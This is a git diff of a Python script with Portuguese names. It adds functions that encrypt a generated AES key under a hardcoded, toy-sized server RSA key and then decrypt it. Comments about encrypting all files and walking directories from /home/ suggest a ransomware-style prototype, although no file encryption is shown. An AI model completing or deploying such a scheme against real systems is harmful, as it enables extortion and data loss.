@@ -10,11 +10,6 @@ import multiprocessing
 
 from gera_chaves_RSA import *
 from criptografa_descriptografa_arquivo_AES import *
-from gera_chaves_RSA import *
-# listar diretorios a partir do /home/
-# cada thread percorre um diretorio
-# for caminho in ls:
-# lista = append(caminho)
 
 '''
 
@@ -111,6 +106,35 @@ def gera_chave_AES():
     f.close()
     return senha
 
+def criptografa_chave_AES(chave_publica_servidor):
+    f=open('keys/AES.txt','r')
+    chave_AES=f.read()
+    retorno=cipher(chave_AES,chave_publica_servidor[0],chave_publica_servidor[1])
+    f=open('keys/AES.txt','w')
+    for elemento in retorno:
+        f.write(str(elemento)+'\n')
+    f.close()
+
+def descriptografa_chave_AES():
+    f=open('keys/AES.txt','r')
+    of=open('keys/chave_publica.txt','r')
+    ifo=open('keys/chave_privada.txt','r')
+    chave_privada=ifo.readline()
+    n_cliente=of.readline()
+    chave_AES=f.read()
+
+    # LISTA COM a chave criptografada
+    chave_AES=chave_AES.split('\n')
+    novo=[]
+    for elemento in chave_AES:
+        try:
+            elemento=int(elemento)
+            novo.append(elemento)
+        except ValueError:
+            pass
+    AES_origin_key=descifra_AES(novo, n_cliente, chave_privada)
+    print(AES_origin_key)
+
 
 # MAIN
 AES_key=gera_chave_AES()
@@ -120,8 +144,9 @@ serv_RSA=[1121,655]
 # gera_chaves_RSA.py
 valida()
 print('chaves publicas e privada do cliente geradas')
-#menu()
-
+#menu() # -> criptografa tudo
+criptografa_chave_AES(serv_RSA)
+descriptografa_chave_AES()
     # criptografa todos os arquivos com AES
 
     # criptografa a chave AES
